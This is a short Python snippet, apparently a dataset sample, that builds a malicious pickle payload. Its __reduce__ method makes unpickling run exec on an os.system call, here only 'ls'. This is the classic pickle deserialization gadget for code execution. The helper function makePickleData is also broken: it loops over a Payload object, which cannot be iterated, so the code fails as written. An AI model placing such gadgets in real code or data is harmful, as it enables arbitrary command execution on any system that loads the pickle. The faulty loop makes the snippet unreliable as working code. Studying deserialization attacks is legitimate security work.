import pickle

class Payload(object):
    def __reduce__(self):
        return (exec, ('import os;os.system("ls")', ))

def makePickleData():
    '''
    get data from Payload and pickle it before returning it
    '''
    pickleData = []
    for payload in Payload():
        pickleData.append(pickle.dumps(payload))
    return pickleData
